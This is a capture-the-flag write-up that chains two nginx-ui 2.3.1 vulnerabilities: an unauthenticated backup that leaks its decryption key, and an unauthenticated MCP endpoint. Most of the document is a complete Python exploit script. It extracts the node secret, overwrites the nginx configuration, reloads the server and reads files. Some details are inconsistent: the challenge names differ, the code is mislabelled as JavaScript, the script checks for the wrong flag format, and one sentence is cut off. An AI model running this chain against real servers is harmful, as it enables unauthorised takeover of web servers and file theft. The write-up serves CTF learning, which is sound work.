# [web] MCPocalypse

> **Category:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

## Description

"CapyTech Solutions" claims their AI understands commands at a glance. You can simply say: "Restart Nginx!", and the server will obey.

# Writeup

## Introduction

This writeup describes the solution for the CTF challenge "Capy CTF: The Secret Node", based on a chain of two critical vulnerabilities in `nginx-ui` version 2.3.1. The goal of the challenge is to obtain the flag located in the file `/flag.txt` inside the `nginx_ui` container, using these vulnerabilities to achieve remote code execution (RCE) or file disclosure.

## Vulnerability Overview

The CTF challenge exploits the following vulnerability chain:

### 1. CVE-2026-27944: Unauthenticated Backup and Key Disclosure

The CVE-2026-27944 vulnerability allows an unauthenticated user to access the `/api/backup` endpoint. This endpoint returns an encrypted archive containing a complete backup of the `nginx-ui` installation, including the `app.ini` file. The critical aspect is that the AES-256-CBC decryption key and initialization vector (IV) are transmitted in plaintext in the `X-Backup-Security` response header.

By decrypting the archive with the obtained keys, you can extract the `app.ini` file, which contains `Node.Secret` — the secret needed to exploit the next vulnerability.

More details here <https://github.com/advisories/GHSA-g9w5-qffc-6762>

### 2. CVE-2026-33032 ("MCPwn"): Unauthenticated MCP Message Handler

The CVE-2026-33032 vulnerability, also known as "MCPwn", is related to the missing authentication check (`AuthRequired()` middleware) on the `/mcp_message` endpoint. `nginx-ui` uses the MCP (Model Context Protocol) protocol to manage Nginx, providing 12 privileged management tools.

Using `Node.Secret` obtained in the first stage, an attacker can establish an unauthenticated SSE session with `/mcp` to obtain a `sessionId`. Then, by sending POST requests to `/mcp_message` with this `sessionId`, any privileged MCP tools can be invoked without any authentication. This allows overwriting Nginx configuration files (`nginx_config_modify`) and reloading the server (`reload_nginx`), leading to remote code execution or file disclosure.

## Vulnerability Chain

### CVE-2026-27944 — Unauthenticated Backup Endpoint + Key Disclosure

`GET /api/backup` requires no authentication. This endpoint returns a full encrypted backup of the nginx-ui installation — including `app.ini` — and sends the AES-256-CBC decryption key and initialization vector (IV) **in plaintext** in the response header:

```
X-Backup-Security: <base64_key>:<base64_iv>
```

```go
r.GET("/backup", CreateBackup)   // ❌ no middleware
r.POST("/restore", middleware.EncryptedForm(), RestoreBackup)
```

From the source code (`api/backup/router.go`):

Decrypting the backup yields `app.ini`, which contains the `[node] Secret` needed for step 2.

### CVE-2026-33032 "MCPwn" — Unauthenticated MCP Message Handler

In nginx-ui v2.3.x, a **Model Context Protocol (MCP)** interface was added, providing 12 nginx management tools. The bug is in one missed middleware call in `mcp/router.go`:

```go
r.Any("/mcp",         middleware.IPWhiteList(), middleware.AuthRequired(), ...)
r.Any("/mcp_message", middleware.IPWhiteList(), ...)   // ❌ AuthRequired() MISSING
```

### How the Chain Works

---

Having the `sessionId` obtained using the node secret, an attacker can send a POST request to `/mcp_message` without any credentials and invoke any privileged tool — including `nginx_config_modify` and `reload_nginx`.

---

 ![img_1.png](./images/img_1.png)

## Solution

### Stage 1: Extracting `Node.Secret` (CVE-2026-27944)

---

The first step is to obtain `Node.Secret` from `app.ini`. This is achieved by sending an unauthenticated GET request to `/api/backup` on `nginx-ui` (port 9000). The `X-Backup-Security` response header will contain the base64-encoded AES key and IV. Then you need to:

1. Decode the key and IV from base64.
2. Decrypt the received encrypted ZIP archive using AES in CBC mode with the obtained key and IV.
3. Extract the `app.ini` file from the decrypted archive.
4. Read the `Secret` value from the `[node]` section of the `app.ini` file.

In this CTF, `Node.Secret` will be 

More details about the vulnerability at <https://github.com/advisories/GHSA-g9w5-qffc-6762>

There's also a ready-made exploit for obtaining `Node.Secret` at <https://github.com/Skynoxk/CVE-2026-27944>

```javascript
[*] CVE-2026-27944 — downloading backup from Nginx-UI (no auth)
[+] AES key+IV from header: 7jeJX3Ph8q4/IpdY...:nuPm7h3U...
[+] Node secret extracted: sicret-ctf-capy-key-2026
```

### Stage 2: Modifying Nginx Configuration and Obtaining the Flag (CVE-2026-33032)

The `MCPSession` class and `mcp_swap` function implement this stage:

1. **Establishing an MCP Session**: An `MCPSession` object is created with `base_url` and `node_secret`. The `connect()` method sends a `GET` request to `f"{self.base_url}/mcp"` with the `node_secret` parameter. The `sessionId` is parsed from the SSE response stream.

   ```python
   self._sse_resp = requests.get(
       f"{self.base_url}/mcp",
       params={"node_secret": self.node_secret},
       stream=True, timeout=5,
   )
   # ... parsing sessionId from the SSE stream
   ```
2. **Modifying Nginx Configuration**: The `call_tool` method is used to send a `POST` request to `f"{self.base_url}/mcp_message"` with the obtained `sessionId`. The `payload` contains a JSON-RPC request calling the `nginx_config_modify` method.

   ```python
   # ... inside mcp_swap
   r = sess.call_tool(
       "nginx_config_modify",
       {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
       msg_id=2,
   )
   ```

   **Payload for** `nginx_config_modify`: `new_content` is a string containing the new Nginx configuration. To obtain the flag, the following `FLAG_CONFIG` is used:

   ```nginx
   server {
       listen 80;
       server_name localhost;
   
       location / {
           proxy_pass http://webapp:80;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
       }
   
       location /flag {
           alias /flag.txt;
           internal;
       }
   
       location /get_flag {
           rewrite ^ /flag break;
       }
   }
   ```
   - `location /flag { alias /flag.txt; internal; }`: This block tells Nginx that when `/flag` is requested, it should serve the contents of `/flag.txt`. The `internal` directive makes this `location` accessible only for internal redirects or subrequests within Nginx, preventing direct external access.
   - `location /get_flag { rewrite ^ /flag break; }`: This block creates a publicly accessible endpoint `/get_flag`. The `rewrite ^ /flag break;` directive rewrites the URL `/get_flag` to `/flag` and stops further rewrite rule processing. Since `/flag` is `internal`, Nginx internally handles it, serving the contents of `/flag.txt` through the public `/get_flag` endpoint.
3. **Reloading Nginx**: After modifying the configuration, the `reload_nginx` method is called via `call_tool` to apply the changes. This is critically important since Nginx doesn't apply configuration changes until a reload.

   ```python
   r = sess.call_tool("reload_nginx", {}, msg_id=3)
   ```
4. **Obtaining the Flag**: After successfully reloading Nginx, the script sends a `GET` request to `f"{webapp_url}/get_flag"` (e.g., `http://localhost:8080/get_flag`). Since `webapp` now serves the modified Nginx configuration, this request will return the contents of `/flag.txt`.

   ```python
   flag_resp = requests.get(f"{webapp_url}/get_flag", timeout=10)
   flag = flag_resp.text.strip()
   ```

```javascript
import argparse
import base64
import configparser
import io
import json
import re
import sys
import threading
import time
import zipfile

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# ── Config templates ──────────────────────────────────────────────────────────

# Original default.conf content (reconstructed based on analysis)
ORIGINAL_CONFIG = """\
server {
    listen 80;
    server_name localhost;

    location / {
        proxy_pass http://webapp:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
"""

# Malicious config to expose the flag
FLAG_CONFIG = """\
server {
    listen 80;
    server_name localhost;

    location / {
        proxy_pass http://webapp:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # Public endpoint to read the flag
    location /get_flag {
        alias /flag.txt;
    }
}
"""

# CVE-2026-27944: unauthenticated backup → node secret

def extract_node_secret(base_url: str) -> str:
    """
    GET /api/backup with no credentials.
    Decrypt the response using the key from X-Backup-Security header.
    Return the [node] Secret from app.ini inside the archive.
    """
    print("[*] CVE-2026-27944 — downloading backup from Nginx-UI (no auth)")
    resp = requests.get(f"{base_url}/api/backup", timeout=30)
    resp.raise_for_status()

    security_header = resp.headers.get("X-Backup-Security", "")
    if not security_header:
        raise RuntimeError("X-Backup-Security header missing — is this v2.3.1?")

    b64_key, b64_iv = security_header.split(":")
    key = base64.b64decode(b64_key)
    iv  = base64.b64decode(b64_iv)
    print(f"[+] AES key+IV from header: {b64_key[:16]}...:{b64_iv[:8]}...")

    # Outer zip: contains nginx-ui.zip (encrypted) + nginx.zip (encrypted) + hash_info.txt
    outer = zipfile.ZipFile(io.BytesIO(resp.content))

    nginx_ui_enc = outer.read("nginx-ui.zip")
    cipher = AES.new(key, AES.MODE_CBC, iv)
    nginx_ui_zip = unpad(cipher.decrypt(nginx_ui_enc), AES.block_size)

    # Inner zip: nginx-ui config directory
    inner = zipfile.ZipFile(io.BytesIO(nginx_ui_zip))
    app_ini_path = next(n for n in inner.namelist() if n.endswith("app.ini"))
    app_ini_data = inner.read(app_ini_path).decode()

    cfg = configparser.RawConfigParser()
    cfg.read_string(app_ini_data)
    secret = cfg.get("node", "Secret", fallback="").strip()
    if not secret:
        raise RuntimeError("Could not find [node] Secret in extracted app.ini")

    print(f"[+] Node secret extracted: {secret}")
    return secret


# CVE-2026-33032: unauthenticated MCP → nginx config overwrite

class MCPSession:
    """Persistent SSE connection for unauthenticated MCP tool calls."""

    def __init__(self, base_url: str, node_secret: str):
        self.base_url = base_url.rstrip("/")
        self.node_secret = node_secret
        self.session_id: str | None = None
        self._sse_resp = None
        self._iter = None
        self._thread: threading.Thread | None = None
        self.messages: list[dict] = []
        self._lock = threading.Lock()

    def connect(self) -> None:
        self._sse_resp = requests.get(
            f"{self.base_url}/mcp",
            params={"node_secret": self.node_secret},
            stream=True, timeout=5,
        )
        self._sse_resp.raise_for_status()
        self._iter = self._sse_resp.iter_lines()
        for raw in self._iter:
            line = raw.decode() if isinstance(raw, bytes) else raw
            if line.startswith("data:"):
                m = re.search(r"sessionId=([a-zA-Z0-9_-]+)", line[5:])
                if m:
                    self.session_id = m.group(1)
                    break
        if not self.session_id:
            raise RuntimeError("No sessionId — wrong node_secret?")
        self._thread = threading.Thread(target=self._drain, daemon=True)
        self._thread.start()

    def _drain(self) -> None:
        try:
            for raw in self._iter:
                line = raw.decode() if isinstance(raw, bytes) else raw
                if line.startswith("data:"):
                    try:
                        with self._lock:
                            self.messages.append(json.loads(line[5:].strip()))
                    except json.JSONDecodeError:
                        pass
        except Exception:
            pass

    def _post(self, payload: dict) -> None:
        requests.post(
            f"{self.base_url}/mcp_message",
            params={"sessionId": self.session_id},
            json=payload, timeout=10,
        )

    def initialize(self) -> None:
        self._post({
            "jsonrpc": "2.0", "id": 0, "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05", "capabilities": {},
                "clientInfo": {"name": "MCPwn-PoC", "version": "1.0"},
            },
        })
        self._wait_for(0)
        self._post({"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}})
        time.sleep(0.3)

    def call_tool(self, tool: str, arguments: dict, msg_id: int, wait: float = 5.0) -> dict | None:
        self._post({
            "jsonrpc": "2.0", "id": msg_id, "method": "tools/call",
            "params": {"name": tool, "arguments": arguments},
        })
        return self._wait_for(msg_id, wait)

    def _wait_for(self, msg_id: int, timeout: float = 5.0) -> dict | None:
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self._lock:
                for m in reversed(self.messages):
                    if m.get("id") == msg_id:
                        return m
            time.sleep(0.1)
        return None

    def close(self) -> None:
        if self._sse_resp:
            self._sse_resp.close()


def mcp_swap(base_url: str, node_secret: str, config_file: str, new_content: str) -> None:
    """Open an unauthenticated MCP session and overwrite an nginx config file."""
    sess = MCPSession(base_url, node_secret)
    print("[*] CVE-2026-33032 — opening unauthenticated MCP session (GET /mcp)")
    sess.connect()
    print(f"[+] sessionId: {sess.session_id}")
    sess.initialize()

    print(f"[*] Overwriting {config_file} via POST /mcp_message (no auth)")
    r = sess.call_tool(
        "nginx_config_modify",
        {"relative_path": config_file, "content": new_content, "sync_overwrite": False},
        msg_id=2,
    )
    if r and "error" in r:
        print(f"[!] modify failed: {r['error']['message']}")
        sess.close()
        sys.exit(1)
    print("[+] Nginx config modified.")

    print("[*] Reloading nginx via POST /mcp_message (no auth)")
    r = sess.call_tool("reload_nginx", {}, msg_id=3)
    if r and "error" in r:
        print(f"[!] reload error: {r['error']['message']}")
    else:
        print("[+] Nginx reloaded — config is live")

    sess.close()


def get_flag(nginx_ui_url: str, landing_url: str, config_file: str) -> None:
    print(f"\n{'='*62}")
    print(f"  Capy CTF Exploit Chain (Architecture Fixed)")
    print(f"  Target Nginx-UI (Admin) : {nginx_ui_url}")
    print(f"  Target Landing (Public) : {landing_url}")
    print(f"{'='*62}\n")

    node_secret = extract_node_secret(nginx_ui_url)
    print()

    print("[*] Injecting flag exposure into Landing's Nginx config...")
    mcp_swap(nginx_ui_url, node_secret, config_file, FLAG_CONFIG)
    time.sleep(2) # Give Nginx a moment to reload

    print("[*] Attempting to retrieve flag from Public Landing URL...")
    try:
        # Access the public-facing Nginx (port 8080) to get the flag
        flag_resp = requests.get(f"{landing_url}/get_flag", timeout=10)
        flag_resp.raise_for_status()
        flag = flag_resp.text.strip()
        if "CAPY{" in flag:
            print(f"\n[+] FLAG FOUND: {flag}")
        else:
            print(f"[!] Could not retrieve flag. Response: {flag}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to retrieve flag: {e}")

    print("\n[*] Resetting Nginx config to original state...")
    mcp_swap(nginx_ui_url, node_secret, config_file, ORIGINAL_CONFIG)
    print("[+] Exploit complete. Nginx config reset.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit script for Capy CTF: The Secret Node"
    )
    parser.add_argument("--nginx-ui-url", default="http://localhost:9000",
                        help="nginx-ui admin panel URL (default: http://localhost:9000)")
    parser.add_argument("--landing-url", default="http://localhost:8080",
                        help="Public Capy Landing URL (default: http://localhost:8080)")
    parser.add_argument("--config", default="default.conf",
                        help="nginx config file to overwrite (default: default.conf)")
    args = parser.parse_args()

    try:
        get_flag(args.nginx_ui_url, args.landing_url, args.config)
    except requests.exceptions.ConnectionError:
        print(f"[!] Cannot connect. Is the lab running?", file=sys.stderr)
        sys.exit(1)
    except Exception as exc:
        print(f"[!] An error occurred: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
```


Flag: `KubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)`